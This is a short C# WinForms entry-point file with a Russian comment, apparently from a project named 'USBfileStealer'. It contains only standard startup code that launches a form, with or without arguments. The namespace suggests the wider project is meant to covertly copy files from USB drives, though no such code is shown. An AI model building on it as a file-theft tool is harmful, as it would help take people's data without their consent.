using System;
using System.Windows.Forms;

namespace USBfileStealer
{
    static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main(string[] Arg)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (Arg.Length==0)           
                Application.Run(new Form1());           
            else
            Application.Run(new Form1(Arg));
        }
    }
}
